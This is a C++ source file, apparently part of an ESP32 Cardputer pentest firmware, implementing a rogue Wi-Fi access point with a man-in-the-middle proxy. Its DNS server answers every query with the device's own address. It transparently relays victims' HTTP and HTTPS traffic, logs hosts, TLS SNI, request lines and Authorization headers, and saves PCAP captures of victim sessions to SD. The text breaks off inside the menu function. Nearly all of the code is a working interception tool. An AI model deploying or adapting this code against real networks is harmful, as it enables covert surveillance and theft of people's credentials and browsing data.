#pragma once
#include <new>
extern "C" {
#include "lwip/tcpip.h"
#include "lwip/priv/tcp_priv.h"   // tcp_tw_pcbs + tcp_abort: reclaim TIME_WAIT PCBs
#include "lwip/udp.h"             // USB MITM : serveur DHCP raw lwIP (reponse sur le netif gadget)
#include "lwip/pbuf.h"
#include "lwip/netif.h"
}
// ============================================================================
//  MITM Proxy (userspace transparent proxy with real upstream internet)
// ----------------------------------------------------------------------------
//  The prebuilt Arduino lwIP has IP forwarding/NAPT compiled out, so we cannot
//  be a kernel NAT router. Instead we bridge at the application layer:
//
//    victim --(rogue AP)--> ESP32 --(STA uplink)--> real AP / internet
//
//  1. AP+STA: softAP (rogue SSID) + STA connected to a real uplink AP.
//  2. DNS on :53 answers EVERY query with our AP IP (redirect-all) and logs it.
//  3. Transparent relay on :80 / :443: read the HTTP Host or TLS SNI, open the
//     real host through the STA uplink, and relay bytes both ways.
//       - HTTP  : full visibility (host, request line, creds/cookies in clear).
//       - HTTPS : blind TCP tunnel -> victim keeps working HTTPS (real cert),
//                 we see the SNI/host + sizes, not the plaintext.
//
//  PoC: one relay at a time (sequential). Enough to prove the mechanism and log
//  traffic; concurrency (a task pool) is the next phase. Authorized / lab use.
// ============================================================================

namespace mitm {

static char   up_ssid[33] = "";
static char   up_pass[65] = "";
static char   ap_ssid[33] = "Evil-Guest";
static char   ap_pass[65] = "";               // rogue AP password: WPA2 if >=8 chars, else open
static bool   running     = false;
static IPAddress apIP(192, 168, 4, 1);

static WiFiUDP    dnsUdp;
static WiFiServer httpSrv(80);
static WiFiServer httpsSrv(443);

// live log ring (lazy-alloc: 0 boot RAM)
#define MITM_LOG_N  40
#define MITM_MAX    5                 // max concurrent relay tasks (x2 TCP PCBs each; lwIP pool ~16; each eats lwIP pbufs from heap)
static String* g_log = nullptr;
static int     g_log_head = 0, g_log_count = 0;
static volatile uint32_t g_dns_q = 0, g_relays = 0;
static volatile int g_active = 0;     // live relay tasks
static SemaphoreHandle_t g_mtx = nullptr;

// ---- optional live PCAP capture to SD (synthetic framing around relayed bytes)
static File              g_pcap;
static File              g_logf;              // streamed session log (full, not just the last 40)
static bool              g_pcap_on  = false;
static SemaphoreHandle_t g_pcap_mtx = nullptr;
static uint32_t          g_pcap_bytes = 0;

// ---- host -> IP cache: skip the blocking per-connection DNS on repeat hosts --
#define MITM_DNS_N   16
#define MITM_DNS_TTL 120000UL          // 2 min
struct DnsEnt { char name[64]; uint32_t ip; uint32_t ts; };
static DnsEnt g_dns[MITM_DNS_N];       // zero-init: name[0]==0 means empty
// Returns the resolved IPv4 (0 on failure). Does the blocking lookup only on a
// cache miss, and never while holding the mutex.
static uint32_t resolve_cached(const char* host) {
    uint32_t now = millis();
    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    for (int i = 0; i < MITM_DNS_N; i++)
        if (g_dns[i].name[0] && now - g_dns[i].ts < MITM_DNS_TTL && !strcmp(g_dns[i].name, host)) {
            uint32_t ip = g_dns[i].ip; if (g_mtx) xSemaphoreGive(g_mtx); return ip;
        }
    if (g_mtx) xSemaphoreGive(g_mtx);
    IPAddress ip;
    if (!WiFi.hostByName(host, ip)) return 0;        // blocking, but only on miss
    uint32_t v = (uint32_t)ip;
    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    int slot = 0; uint32_t oldest = 0xffffffffUL;
    for (int i = 0; i < MITM_DNS_N; i++) { if (!g_dns[i].name[0]) { slot = i; break; } if (g_dns[i].ts < oldest) { oldest = g_dns[i].ts; slot = i; } }
    strncpy(g_dns[slot].name, host, sizeof(g_dns[slot].name) - 1); g_dns[slot].name[sizeof(g_dns[slot].name) - 1] = 0;
    g_dns[slot].ip = v; g_dns[slot].ts = now;
    if (g_mtx) xSemaphoreGive(g_mtx);
    return v;
}

// ---- reclaim TCP PCBs stuck in TIME_WAIT ------------------------------------
// The lwIP pool is only ~16 PCBs and a browser's keep-alive closes churn them
// into 60 s TIME_WAIT, wedging accept()/connect() after a handful of pages even
// with 0 active relays. SO_LINGER is not compiled in this core, so we abort the
// TIME_WAIT PCBs ourselves from the tcpip thread (safe: core-locking is off).
static void tw_flush_cb(void*) {
    // TIME_WAIT: always reap. The connection is fully closed, abort frees the
    // PCB without sending anything (no RST), so this never hurts the client.
    struct tcp_pcb* p = tcp_tw_pcbs;
    while (p) { struct tcp_pcb* next = p->next; tcp_abort(p); p = next; }
    // Half-closed (FIN_WAIT_2/LAST_ACK/CLOSING): aborting these RSTs the peer,
    // which breaks a browser keep-alive it was about to reuse (ERR_CONNECTION_
    // RESET). So only force-reap them under real pressure, when the 16-PCB pool
    // is nearly full; otherwise let them close cleanly on lwIP's own timeout.
    int act = 0;
    for (struct tcp_pcb* q = tcp_active_pcbs; q; q = q->next) act++;
    if (act < 11) return;                       // headroom left: don't RST keep-alives
    p = tcp_active_pcbs;
    while (p) {
        struct tcp_pcb* next = p->next;
        if (p->state == FIN_WAIT_2 || p->state == LAST_ACK || p->state == CLOSING) tcp_abort(p);
        p = next;
    }
}
static inline void flush_time_wait() { tcpip_callback(tw_flush_cb, nullptr); }

// ---- live PCB census (diagnostic): which state clogs the 16-PCB pool? -------
static volatile uint16_t g_pcb_act = 0, g_pcb_tw = 0, g_pcb_syn = 0, g_pcb_fin = 0, g_pcb_cw = 0, g_pcb_est = 0;
static void pcb_census_cb(void*) {
    uint16_t a = 0, syn = 0, fin = 0, cw = 0, est = 0, tw = 0;
    for (struct tcp_pcb* p = tcp_active_pcbs; p; p = p->next) { a++;
        switch (p->state) {
            case SYN_SENT: case SYN_RCVD: syn++; break;
            case ESTABLISHED: est++; break;
            case FIN_WAIT_1: case FIN_WAIT_2: case CLOSING: case LAST_ACK: fin++; break;
            case CLOSE_WAIT: cw++; break;
            default: break;
        }
    }
    for (struct tcp_pcb* p = tcp_tw_pcbs; p; p = p->next) tw++;
    g_pcb_act = a; g_pcb_syn = syn; g_pcb_fin = fin; g_pcb_cw = cw; g_pcb_est = est; g_pcb_tw = tw;
}
static inline void pcb_census() { tcpip_callback(pcb_census_cb, nullptr); }

static void logln(const String& s);   // defined below; used by pcap_open

// ---- live PCAP capture ------------------------------------------------------
// We don't sniff at L2; we rebuild synthetic Ethernet/IPv4/TCP headers around
// the bytes we relay, so Wireshark reassembles each victim<->host stream
// (HTTP in clear, TLS as ciphertext + the SNI). Opt-in, written to SD.
static void pcap_open() {
    if (!g_pcap_mtx) g_pcap_mtx = xSemaphoreCreateMutex();
    SD.mkdir("/evil"); SD.mkdir("/evil/mitm");
    char path[48]; snprintf(path, sizeof path, "/evil/mitm/cap_%lu.pcap", (unsigned long)millis());
    g_pcap = SD.open(path, FILE_WRITE);
    if (!g_pcap) { g_pcap_on = false; logln("PCAP open FAIL"); return; }
    uint8_t gh[24] = {0};
    uint32_t magic = 0xa1b2c3d4, snap = 65535, net = 1;   // LE host, LINKTYPE_ETHERNET
    memcpy(gh, &magic, 4); gh[4] = 2; gh[6] = 4;           // version 2.4
    memcpy(gh + 16, &snap, 4); memcpy(gh + 20, &net, 4);
    g_pcap.write(gh, 24); g_pcap.flush();
    g_pcap_on = true; g_pcap_bytes = 0;
    logln(String("PCAP ") + path);
}
// one synthetic TCP segment (data may be null for handshake/FIN)
static void pcap_seg(IPAddress sip, IPAddress dip, uint16_t sport, uint16_t dpt,
                     uint32_t seq, uint32_t ack, uint8_t flags, const uint8_t* data, uint16_t dlen) {
    if (!g_pcap_on) return;
    uint8_t h[54];
    const uint8_t ms[6] = {0x02,0,0,0,0,0x01}, md[6] = {0x02,0,0,0,0,0x02};
    memcpy(h, md, 6); memcpy(h + 6, ms, 6); h[12] = 0x08; h[13] = 0x00;        // Ethernet, IPv4
    uint8_t* ip = h + 14; uint16_t tot = 40 + dlen;
    ip[0] = 0x45; ip[1] = 0; ip[2] = tot >> 8; ip[3] = tot & 0xff;
    ip[4] = ip[5] = 0; ip[6] = 0x40; ip[7] = 0; ip[8] = 64; ip[9] = 6; ip[10] = ip[11] = 0;
    ip[12] = sip[0]; ip[13] = sip[1]; ip[14] = sip[2]; ip[15] = sip[3];
    ip[16] = dip[0]; ip[17] = dip[1]; ip[18] = dip[2]; ip[19] = dip[3];
    uint8_t* t = h + 34;
    t[0] = sport >> 8; t[1] = sport; t[2] = dpt >> 8; t[3] = dpt;
    t[4] = seq >> 24; t[5] = seq >> 16; t[6] = seq >> 8; t[7] = seq;
    t[8] = ack >> 24; t[9] = ack >> 16; t[10] = ack >> 8; t[11] = ack;
    t[12] = 0x50; t[13] = flags; t[14] = 0xff; t[15] = 0xff; t[16] = t[17] = t[18] = t[19] = 0;
    uint32_t caplen = 54 + dlen, sec = millis() / 1000, usec = (millis() % 1000) * 1000;
    uint8_t rh[16]; memcpy(rh, &sec, 4); memcpy(rh + 4, &usec, 4); memcpy(rh + 8, &caplen, 4); memcpy(rh + 12, &caplen, 4);
    if (g_pcap_mtx) xSemaphoreTake(g_pcap_mtx, portMAX_DELAY);
    if (g_pcap_on) { g_pcap.write(rh, 16); g_pcap.write(h, 54); if (dlen) g_pcap.write(data, dlen); g_pcap_bytes += caplen + 16; }
    if (g_pcap_mtx) xSemaphoreGive(g_pcap_mtx);
}
// one synthetic UDP packet (used to log DNS query/response into the pcap)
static void pcap_udp(IPAddress sip, IPAddress dip, uint16_t sport, uint16_t dpt,
                     const uint8_t* data, uint16_t dlen) {
    if (!g_pcap_on) return;
    uint8_t h[42];
    const uint8_t ms[6] = {0x02,0,0,0,0,0x01}, md[6] = {0x02,0,0,0,0,0x02};
    memcpy(h, md, 6); memcpy(h + 6, ms, 6); h[12] = 0x08; h[13] = 0x00;        // Ethernet, IPv4
    uint8_t* ip = h + 14; uint16_t tot = 28 + dlen;
    ip[0] = 0x45; ip[1] = 0; ip[2] = tot >> 8; ip[3] = tot & 0xff;
    ip[4] = ip[5] = 0; ip[6] = 0x40; ip[7] = 0; ip[8] = 64; ip[9] = 17; ip[10] = ip[11] = 0;  // proto 17 = UDP
    ip[12] = sip[0]; ip[13] = sip[1]; ip[14] = sip[2]; ip[15] = sip[3];
    ip[16] = dip[0]; ip[17] = dip[1]; ip[18] = dip[2]; ip[19] = dip[3];
    uint8_t* u = h + 34; uint16_t ul = 8 + dlen;
    u[0] = sport >> 8; u[1] = sport; u[2] = dpt >> 8; u[3] = dpt;
    u[4] = ul >> 8; u[5] = ul; u[6] = u[7] = 0;                                // length, checksum 0
    uint32_t caplen = 42 + dlen, sec = millis() / 1000, usec = (millis() % 1000) * 1000;
    uint8_t rh[16]; memcpy(rh, &sec, 4); memcpy(rh + 4, &usec, 4); memcpy(rh + 8, &caplen, 4); memcpy(rh + 12, &caplen, 4);
    if (g_pcap_mtx) xSemaphoreTake(g_pcap_mtx, portMAX_DELAY);
    if (g_pcap_on) { g_pcap.write(rh, 16); g_pcap.write(h, 42); if (dlen) g_pcap.write(data, dlen); g_pcap_bytes += caplen + 16; }
    if (g_pcap_mtx) xSemaphoreGive(g_pcap_mtx);
}
static void pcap_close() {
    if (!g_pcap_on) return;
    if (g_pcap_mtx) xSemaphoreTake(g_pcap_mtx, portMAX_DELAY);
    g_pcap_on = false; g_pcap.flush(); g_pcap.close();
    if (g_pcap_mtx) xSemaphoreGive(g_pcap_mtx);
}

static bool log_alloc() { if (!g_log) g_log = new (std::nothrow) String[MITM_LOG_N]; g_log_head = g_log_count = 0; return g_log != nullptr; }
static void log_free()  { if (g_log) { delete[] g_log; g_log = nullptr; } }
static void logln(const String& s) {
    if (!g_log) return;
    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    g_log[g_log_head] = s;
    g_log_head = (g_log_head + 1) % MITM_LOG_N;
    if (g_log_count < MITM_LOG_N) g_log_count++;
    if (g_logf) g_logf.println(s);        // stream the FULL log to SD (ring is only for the on-screen view)
    if (g_mtx) xSemaphoreGive(g_mtx);
}

// ---- minimal DNS: reply A -> apIP for every query, log the QNAME -----------
// Returns true if it handled a packet (so the caller can drain the whole queue).
static bool dns_poll() {
    int sz = dnsUdp.parsePacket();
    if (sz <= 12 || sz > 512) { if (sz > 0) dnsUdp.flush(); return false; }
    uint8_t buf[512];
    int n = dnsUdp.read(buf, sizeof buf); if (n < 12) return true;
    IPAddress dcli = dnsUdp.remoteIP(); uint16_t dcport = dnsUdp.remotePort();
    if (g_pcap_on) pcap_udp(dcli, apIP, dcport, 53, buf, n);   // log the DNS query (client -> us)
    // extract QNAME (labels) starting at offset 12
    String qname; int p = 12;
    while (p < n && buf[p] != 0) {
        int len = buf[p++]; if (len <= 0 || p + len > n) break;
        if (qname.length()) qname += '.';
        for (int i = 0; i < len; i++) qname += (char)buf[p + i];
        p += len;
    }
    g_dns_q++;
    // QTYPE sits right after the QNAME null label (buf[p]==0): [null][QTYPE:2][QCLASS:2]
    int qtype = (p + 2 < n) ? ((buf[p + 1] << 8) | buf[p + 2]) : 1;
    if (qname.length()) logln(String("DNS ") + qname + (qtype == 28 ? " AAAA" : qtype == 65 ? " HTTPS" : qtype == 1 ? "" : (" t" + String(qtype))));
    // build response: reuse the query, set QR+AA+RA (NOERROR).
    int qend = p + 1 + 4;                 // null label + QTYPE + QCLASS
    if (qend > n) qend = n;
    buf[2] = 0x81; buf[3] = 0x80;         // flags: response, recursion available, NOERROR
    buf[6] = buf[7] = 0;                  // ANCOUNT (set to 1 only for A below)
    buf[8] = buf[9] = buf[10] = buf[11] = 0;
    int o = qend;
    // Only A (1) and ANY (255) get our redirect address. AAAA (28), HTTPS/SVCB
    // (65) and the rest get an authoritative EMPTY NOERROR answer, so the victim
    // (esp. dual-stack Linux/Kali, which queries AAAA/HTTPS first) falls back to
    // IPv4 at once and routes through our relay, instead of the old bogus
    // A-record-for-an-AAAA-query that stalled getaddrinfo.
    if (qtype == 1 || qtype == 255) {
        buf[7] = 0x01;                    // ANCOUNT = 1
        uint8_t ans[] = { 0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3C,
                          0x00, 0x04, (uint8_t)apIP[0], (uint8_t)apIP[1], (uint8_t)apIP[2], (uint8_t)apIP[3] };
        if (o + (int)sizeof(ans) <= (int)sizeof buf) { memcpy(buf + o, ans, sizeof ans); o += sizeof ans; }
    }
    dnsUdp.beginPacket(dnsUdp.remoteIP(), dnsUdp.remotePort());
    dnsUdp.write(buf, o);
    dnsUdp.endPacket();
    if (g_pcap_on) pcap_udp(apIP, dcli, 53, dcport, buf, o);   // log the DNS response (us -> client)
    return true;
}

// ---- parse a TLS ClientHello for the SNI host ------------------------------
static bool tls_sni(const uint8_t* b, int n, String& host) {
    if (n < 45 || b[0] != 0x16) return false;             // TLS handshake record
    int p = 5;                                            // skip record header
    if (p + 4 > n || b[p] != 0x01) return false;          // ClientHello
    p += 4;                                               // handshake type+len
    p += 2 + 32;                                          // version + random
    if (p >= n) return false;
    int sid = b[p++]; p += sid;                           // session id
    if (p + 2 > n) return false;
    int cs = (b[p] << 8) | b[p + 1]; p += 2 + cs;         // cipher suites
    if (p >= n) return false;
    int cm = b[p++]; p += cm;                             // compression
    if (p + 2 > n) return false;
    int extlen = (b[p] << 8) | b[p + 1]; p += 2;
    int end = p + extlen; if (end > n) end = n;
    while (p + 4 <= end) {
        int et = (b[p] << 8) | b[p + 1];
        int el = (b[p + 2] << 8) | b[p + 3]; p += 4;
        if (et == 0x0000) {                               // server_name
            int sp = p + 2;                               // skip server_name_list len
            if (sp + 3 <= end && b[sp] == 0x00) {
                int hl = (b[sp + 1] << 8) | b[sp + 2]; sp += 3;
                if (sp + hl <= n) { for (int i = 0; i < hl; i++) host += (char)b[sp + i]; return host.length() > 0; }
            }
        }
        p += el;
    }
    return false;
}

// find CRLFCRLF (end of HTTP headers)
static bool memmem_crlf(const uint8_t* b, int n) {
    for (int i = 0; i + 3 < n; i++) if (b[i] == '\r' && b[i + 1] == '\n' && b[i + 2] == '\r' && b[i + 3] == '\n') return true;
    return false;
}

// ---- relay one victim connection to its real destination via STA -----------
#define MITM_HEAD 1600   // hold a full TLS ClientHello (TLS1.3 ones run 500-900+ B; SNI can sit after key_share/ALPN)
static void handle_conn(WiFiClient down, uint16_t port) {
    down.setTimeout(3);
    uint8_t* head = (uint8_t*)malloc(MITM_HEAD + 1);
    if (!head) { down.stop(); return; }
    int hn = 0; uint32_t t0 = millis();
    while (hn < MITM_HEAD && millis() - t0 < 1500) {
        while (down.available() && hn < MITM_HEAD) head[hn++] = (uint8_t)down.read();
        if (port == 80) { if (hn >= 4 && memmem_crlf(head, hn)) break; }
        else { if (hn >= 5) { int rec = (((int)head[3] << 8) | head[4]) + 5; if (hn >= rec) break; } }  // read the WHOLE ClientHello record (up to MITM_HEAD) so the SNI is always captured
        delay(2);
    }
    head[hn] = 0;
    char host[128] = ""; uint16_t dport = port;
    if (port == 80) {
        char* hp = strstr((char*)head, "Host:"); if (!hp) hp = strstr((char*)head, "host:");
        if (hp) { hp += 5; while (*hp == ' ') hp++; int i = 0; while (*hp && *hp != '\r' && *hp != '\n' && i < 127) host[i++] = *hp++; host[i] = 0; }
        char req[48] = ""; for (int i = 0; i < 47 && head[i] && head[i] != '\r' && head[i] != '\n'; i++) req[i] = (char)head[i];
        logln(String("HTTP ") + host + " " + req);
        if (strstr((char*)head, "Authorization:")) logln(String("  AUTH ") + host);
    } else {
        String s; if (tls_sni(head, hn, s)) strncpy(host, s.c_str(), sizeof(host) - 1);
        logln(String("TLS  ") + (host[0] ? host : "?"));
    }
    if (!host[0]) { free(head); down.stop(); return; }
    char* colon = strchr(host, ':'); if (colon) { dport = (uint16_t)atoi(colon + 1); *colon = 0; }
    WiFiClient up;
    uint32_t rip = resolve_cached(host);
    if (!rip) { logln(String("DNS? ") + host); free(head); down.stop(); return; }
    if (!up.connect(IPAddress(rip), dport ? dport : port, 4000)) { logln(String("FAIL ") + host); free(head); down.stop(); return; }  // bounded connect by cached IP: free the slot fast on a dead host
    up.setNoDelay(true); down.setNoDelay(true); up.setTimeout(3);
    g_relays++;
    IPAddress vip = down.remoteIP(); uint16_t vport = down.remotePort();
    IPAddress hip = IPAddress(rip);  uint16_t hport = dport ? dport : port;
    uint32_t cseq = 1000, sseq = 2000;                       // synthetic seq numbers for the pcap
    if (g_pcap_on) {
        pcap_seg(vip, hip, vport, hport, cseq, 0,            0x02, nullptr, 0);   // SYN
        pcap_seg(hip, vip, hport, vport, sseq, cseq + 1,     0x12, nullptr, 0);   // SYN-ACK
        pcap_seg(vip, hip, vport, hport, cseq + 1, sseq + 1, 0x10, nullptr, 0);   // ACK
        cseq++; sseq++;
    }
    up.write(head, hn);                               // forward what we already consumed
    if (g_pcap_on && hn) { pcap_seg(vip, hip, vport, hport, cseq, sseq, 0x18, head, hn); cseq += hn; }
    free(head);
    const int BUF = 1460; uint8_t buf[BUF]; uint32_t idle = millis();
    while ((down.connected() || down.available()) && (up.connected() || up.available())) {
        bool moved = false; int a;
        while ((a = down.available()) > 0) { int r = down.read(buf, a > BUF ? BUF : a); if (r > 0) { up.write(buf, r); if (g_pcap_on) { pcap_seg(vip, hip, vport, hport, cseq, sseq, 0x18, buf, r); cseq += r; } moved = true; } else break; }
        while ((a = up.available()) > 0)   { int r = up.read(buf, a > BUF ? BUF : a);   if (r > 0) { down.write(buf, r); if (g_pcap_on) { pcap_seg(hip, vip, hport, vport, sseq, cseq, 0x18, buf, r); sseq += r; } moved = true; } else break; }
        if (moved) idle = millis();
        else { if (millis() - idle > 1500) break; delay(2); }   // free idle slots fast so the scarce 5-slot pool turns over for page fan-out (keep-alive reuse loses to starving the other connections here)
        if (!running) break;
        if (ESP.getFreeHeap() < 16000) break;                   // heap safety valve: drop this relay before lwIP/WiFi starve
    }
    if (g_pcap_on) {
        pcap_seg(vip, hip, vport, hport, cseq, sseq, 0x11, nullptr, 0);           // FIN-ACK
        pcap_seg(hip, vip, hport, vport, sseq, cseq + 1, 0x11, nullptr, 0);
    }
    up.stop(); down.stop();
}

// ---- one FreeRTOS task per victim connection (concurrency) -----------------
struct Conn { WiFiClient client; uint16_t port; };
static void relay_task(void* arg) {
    Conn* c = (Conn*)arg;
    handle_conn(c->client, c->port);
    delete c;
    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    g_active--;
    if (g_mtx) xSemaphoreGive(g_mtx);
    vTaskDelete(NULL);
}
static void spawn(WiFiClient c, uint16_t port) {
    if (g_active >= MITM_MAX || ESP.getFreeHeap() < 45000) { c.stop(); return; }   // pool full / low heap: drop (45K keeps pbuf headroom while rejecting fewer conns)
    Conn* k = new (std::nothrow) Conn{c, port};
    if (!k) { c.stop(); return; }
    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    g_active++;
    if (g_mtx) xSemaphoreGive(g_mtx);
    if (xTaskCreatePinnedToCore(relay_task, "mitmr", 4096, k, 2, NULL, 1) != pdPASS) {
        delete k; if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY); g_active--; if (g_mtx) xSemaphoreGive(g_mtx); c.stop();
    }
}

// ---- UI helpers ------------------------------------------------------------
static void mhdr(const char* title) {
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.fillRect(0, 0, M5.Display.width(), 14, 0x0841);
    M5.Display.drawFastHLine(0, 14, M5.Display.width(), TFT_GREEN);
    M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_GREEN, 0x0841);
    int tw = (int)(strlen(title) * 9); int tx = (M5.Display.width() - tw) / 2; if (tx < 0) tx = 0;
    M5.Display.setCursor(tx, 0); M5.Display.println(title);
}
static bool mtext(const char* title, char* buf, size_t cap, bool mask) {
    int len = (int)strlen(buf); bool rd = true; enterDebounce();
    while (true) {
        if (rd) {
            mhdr(title); M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
            M5.Display.setCursor(8, 44);
            if (mask) { for (int i = 0; i < len; i++) M5.Display.print('*'); } else M5.Display.print(buf);
            M5.Display.print('_');
            M5.Display.setTextSize(1); M5.Display.setTextColor(0x5AEB, TFT_BLACK);
            M5.Display.setCursor(6, 120); M5.Display.println("type   ENTER ok   DEL back");
            M5.Display.display(); rd = false;
        }
        M5.update(); cardUpdate();
        if (M5Cardputer.Keyboard.isChange()) {
            auto st = M5Cardputer.Keyboard.keysState();
            for (auto c : st.word) if (c >= 32 && c < 127 && len < (int)cap - 1) { buf[len++] = (char)c; buf[len] = 0; rd = true; }
            if (st.del) { if (len > 0) { buf[--len] = 0; rd = true; } else { keyRelease(); return false; } }
            if (st.enter) { keyRelease(); return true; }
        }
        delay(25);
    }
}
static void draw_status() {
    mhdr("MITM Proxy");
    M5.Display.setTextSize(1);
    bool sta = (WiFi.status() == WL_CONNECTED);
    M5.Display.setTextColor(sta ? TFT_GREEN : TFT_RED, TFT_BLACK);
    M5.Display.setCursor(5, 18); M5.Display.printf("uplink %s %s", up_ssid, sta ? WiFi.localIP().toString().c_str() : "(no link)");
    M5.Display.setTextColor(0x5AEB, TFT_BLACK); M5.Display.setCursor(5, 30);
    M5.Display.printf("AP '%s'  clients:%d", ap_ssid, WiFi.softAPgetStationNum());
    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK); M5.Display.setCursor(5, 42);
    M5.Display.printf("DNS:%lu  relays:%lu  act:%d/%d", (unsigned long)g_dns_q, (unsigned long)g_relays, g_active, MITM_MAX);
    if (g_pcap_on) { M5.Display.setTextColor(TFT_RED, TFT_BLACK); M5.Display.setCursor(176, 42); M5.Display.printf("R%luKB", (unsigned long)(g_pcap_bytes / 1024)); }
    M5.Display.setTextColor(TFT_CYAN, TFT_BLACK); M5.Display.setCursor(5, 52);
    M5.Display.printf("P:%d fw:%d cw:%d tw:%d H:%luk", (int)g_pcb_act, (int)g_pcb_fin, (int)g_pcb_cw, (int)g_pcb_tw, (unsigned long)(ESP.getFreeHeap() / 1024));
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    int rows = 5, y = 64;
    for (int i = 0; i < rows && i < g_log_count; i++) {
        int idx = (g_log_head - 1 - i + MITM_LOG_N * 2) % MITM_LOG_N;
        M5.Display.setCursor(5, y + i * 10); M5.Display.printf("%.40s", g_log[idx].c_str());
    }
    M5.Display.setTextColor(0x5AEB, TFT_BLACK); M5.Display.setCursor(5, 122); M5.Display.print("BACK = stop");
    M5.Display.display();
}

// ---- run the proxy ---------------------------------------------------------
static void run() {
    // Auto-config the uplink: if we are already on a WiFi with internet, reuse
    // it; otherwise fall back to the last-connected / saved network creds.
    bool preConnected = (WiFi.status() == WL_CONNECTED);
    if (preConnected && !up_ssid[0]) {
        WiFi.SSID().toCharArray(up_ssid, sizeof up_ssid);
        if (password.length()) password.toCharArray(up_pass, sizeof up_pass);
    } else if (!up_ssid[0] && ssid.length()) {
        ssid.toCharArray(up_ssid, sizeof up_ssid);
        password.toCharArray(up_pass, sizeof up_pass);
    }
    if (!up_ssid[0]) { mhdr("MITM Proxy"); M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_ORANGE, TFT_BLACK); M5.Display.setCursor(8, 48); M5.Display.println("Set uplink SSID first"); M5.Display.display(); delay(1200); return; }
    if (confirmPopup("Capture to PCAP?")) pcap_open();   // ask before launching
    if (!log_alloc()) return;
    g_dns_q = g_relays = 0; g_active = 0; running = true;
    if (!g_mtx) g_mtx = xSemaphoreCreateMutex();
    SD.mkdir("/evil"); SD.mkdir("/evil/mitm");           // stream the full session log to SD
    g_logf = SD.open("/evil/mitm/session.log", FILE_APPEND);
    if (g_logf) g_logf.printf("=== MITM session %lu ===\n", (unsigned long)millis());
    WiFi.mode(WIFI_AP_STA);
    WiFi.setSleep(false);                         // modem-sleep in AP+STA causes drops
    WiFi.persistent(false);
    WiFi.setAutoReconnect(true);
    if (!preConnected) WiFi.begin(up_ssid, up_pass);   // keep an existing link alive
    mhdr("MITM Proxy"); M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.setCursor(8, 48); M5.Display.println(preConnected ? "Reusing uplink..." : "Connecting uplink..."); M5.Display.display();
    uint32_t t0 = millis(); while (WiFi.status() != WL_CONNECTED && millis() - t0 < 15000) { delay(200); }
    int ch = (WiFi.status() == WL_CONNECTED) ? WiFi.channel() : 1; if (ch < 1 || ch > 13) ch = 1;
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ap_ssid, (strlen(ap_pass) >= 8) ? ap_pass : NULL, ch);   // WPA2 if pass>=8, else open; AP on STA channel
    dnsUdp.begin(53); httpSrv.begin(); httpsSrv.begin();
    uint32_t lastChk = millis();
    enterDebounce(); uint32_t lastDraw = 0, lastTw = 0;
    while (running) {
        M5.update(); cardUpdate();
        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
        if (WiFi.status() != WL_CONNECTED && millis() - lastChk > 5000) {   // force a fresh association
            lastChk = millis();
            WiFi.begin(up_ssid, up_pass);
        } else if (WiFi.status() == WL_CONNECTED) {
            int sc = WiFi.channel();                 // STA may land on a new channel after a reassoc
            if (sc >= 1 && sc <= 13 && sc != ch) {   // single radio: realign the AP or victims lose it
                ch = sc;
                WiFi.softAP(ap_ssid, (strlen(ap_pass) >= 8) ? ap_pass : NULL, ch);
            }
        }
        for (int d = 0; d < 24 && dns_poll(); d++) ;        // drain the whole DNS queue (bursts)
        WiFiClient c; while (g_active < MITM_MAX && (c = httpSrv.available()))  spawn(c, 80);   // drain the SYN backlog each tick
        WiFiClient s; while (g_active < MITM_MAX && (s = httpsSrv.available())) spawn(s, 443);
        if (millis() - lastTw > 1500) { lastTw = millis(); flush_time_wait();     // keep the PCB pool from clogging with TIME_WAIT
            pcb_census();
            Serial.printf("[MITM] pcb act=%d est=%d syn=%d fin=%d cw=%d tw=%d  heap=%lu  slots=%d/%d\n",
                          (int)g_pcb_act, (int)g_pcb_est, (int)g_pcb_syn, (int)g_pcb_fin, (int)g_pcb_cw, (int)g_pcb_tw,
                          (unsigned long)ESP.getFreeHeap(), g_active, MITM_MAX);
            if (g_pcap_on && g_pcap_mtx) { xSemaphoreTake(g_pcap_mtx, portMAX_DELAY); g_pcap.flush(); xSemaphoreGive(g_pcap_mtx); }
            if (g_logf && g_mtx) { xSemaphoreTake(g_mtx, portMAX_DELAY); g_logf.flush(); xSemaphoreGive(g_mtx); } }
        if (millis() - lastDraw > 400) { lastDraw = millis(); draw_status(); }
        delay(1);
    }
    running = false;
    // let in-flight relay tasks notice !running and exit before tearing down
    uint32_t td = millis();
    while (g_active > 0 && millis() - td < 10000) { dns_poll(); delay(20); }
    pcap_close();                                   // relays have exited: safe to close the capture
    httpSrv.end(); httpsSrv.end(); dnsUdp.stop();
    WiFi.softAPdisconnect(true); WiFi.disconnect(true); WiFi.mode(WIFI_OFF);
    // dump log to SD
    SD.mkdir("/evil"); SD.mkdir("/evil/mitm");
    if (g_logf) { if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY); g_logf.flush(); g_logf.close(); if (g_mtx) xSemaphoreGive(g_mtx); }  // full log already streamed
    log_free();
}

static void usbArmAndReboot();   // USB MITM : arme le gadget + reboot (defini plus bas)

inline void menu() {
    const char* it[] = { "Set uplink SSID", "Set uplink pass", "Set rogue SSID", "Set rogue pass", "Start MITM proxy", "USB MITM (gadget) + reboot" };
    const int N = 6;
    int sel = 0; bool rd = true; enterDebounce();
    while (true) {
        if (rd) {
            mhdr("MITM Proxy"); M5.Display.setTextSize(menuTextSize);
            const int mlh = menuLineH + 3;
            for (int i = 0; i < N; i++) { int y = 18 + i * mlh;
                if (i == sel) { M5.Display.fillRect(0, y - 1, M5.Display.width(), mlh, menuSelectedBackgroundColor); M5.Display.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor); }
